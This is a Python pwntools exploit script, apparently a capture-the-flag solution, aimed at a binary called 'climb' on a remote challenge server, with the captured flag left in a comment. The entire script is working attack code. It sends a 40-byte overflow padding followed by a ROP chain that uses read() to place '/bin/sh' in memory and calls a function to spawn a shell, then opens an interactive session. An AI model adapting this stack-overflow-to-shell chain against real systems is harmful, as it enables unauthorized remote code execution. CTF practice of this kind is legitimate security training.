from pwn import *

context.binary = elf = ELF('./climb')
p = remote("cha.hackpack.club", 41702)
# p = process('./climb')
#gdb.attach(p,'init-pwndbg\nb *0x4006D4')
bss = elf.bss(0x20)
rop = ROP(elf)
ret=rop.find_gadget(['ret'])[0]
pop_rdi=rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi_r15=rop.find_gadget(['pop rsi','pop r15', 'ret'])[0]
payload = "A"*40+flat([
    pop_rdi, 0,
    pop_rsi_r15,bss,0,
    elf.plt['read'],
    pop_rdi,bss,
    ret,
    elf.symbols['call_me']
])


p.sendlineafter("respond? ", payload)
p.sendline("/bin/sh\x00")
p.sendline("/bin/sh\x00")
p.interactive()
# flag{w0w_A_R34L_LiF3_R0pp3r!}

